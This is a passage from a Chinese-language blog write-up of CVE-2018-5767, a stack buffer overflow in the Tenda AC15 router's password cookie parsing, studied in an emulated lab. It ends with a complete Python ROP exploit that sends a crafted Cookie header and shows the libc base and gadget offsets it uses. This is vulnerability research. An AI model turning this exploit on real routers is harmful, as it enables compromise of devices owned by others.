<p>通过伪代码，我们可以看到，这里是把这里是在寻找<code>password=</code>和之后的内容，然后把 <code>=</code>和 <code>;</code>之中的内容读取到 <code>v31</code>中。</p>
<p>溢出点就在这里，v31的大小只有0x1c0，所以我们读取1000个字符，会造成溢出。</p>
<h3 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h3>
<p>因为存在/x00截断，所以构造rop时，不能使用三个字节的地址。<del>除非二进制文件本身足够大，否则只能去libc里找地址，如果同时libc开启了pie，那这个漏洞基本就没了</del></p>
<p>因为我们要控制返回地址从而控制程序流，而现在的问题就是/x00截断。因为/x00截断，所以我们必须去libc中寻找四个字节的ROP地址。但是libc中又开启了PIE，但路由所提供的服务不能泄露libc的地址，因为这个基地址我们只能到路由设备上进行查看：</p>
<blockquote>
<p>查看的方法有两种：</p>
<p>1.<code>cat /proc/[pid]/maps</code></p>
<p>2.在gdb中查看puts函数的地址，再减去puts函数在libc中的偏移</p>
</blockquote>
<p>我选择的是方法二，因为方法一查出来的libc基地址不准确，个人猜测是qemu模拟环境的问题</p>
<p>![image-20230103092612044](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103092612044.png)</p>
<p>然后puts在libc中的偏移量为 <code>0x35cd4</code></p>
<p>故基地址为 <code>0x3fe1bcd4-0x35cd4=0x3fde6000</code></p>
<p>随后我们寻找ROP：</p>
<p>![image-20230103093949704](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103093949704.png)</p>
<p>![image-20230103094046647](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103094046647.png)</p>
<p>通过这两个指令我们可以看到：</p>
<p>首先把puts放入r3，把下一条指令地址放入pc，随后将栈顶（参数）放入r0，然后跳转到函数</p>
<p>故最后的exp：</p>
<pre tabindex="0"><code>import struct
import requests

string = &#34;shoukaku&#34;

puts = 0x3fe1bcd4
libc_base = puts-0x35cd4
pop_r3_pc = struct.pack(&#39;&lt;I&#39;,libc_base + 0x00018298)
mov_r0_ps = struct.pack(&#34;&lt;I&#34;,libc_base + 0x00040cb8)

paylorad = b&#39;a&#39;*444+b&#39;.png&#39;+pop_r3_pc+struct.pack(&#39;&lt;I&#39;, puts)+mov_r0_ps+string.encode()

head = {
    &#34;User-Agent&#34;:&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#34;,
    &#34;Accept&#34;:&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;,
    &#34;Cookie&#34;:b&#34;password=&#34;+paylorad
}

requests.get(url=&#39;http://192.168.52.128/goform/hello&#39;, headers=head)
</code></pre><p>![image-20230103101303369](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103101303369.png)</p>
<p>最后成功的输出字符串</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="http://lexshoukaku.github.io">test</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
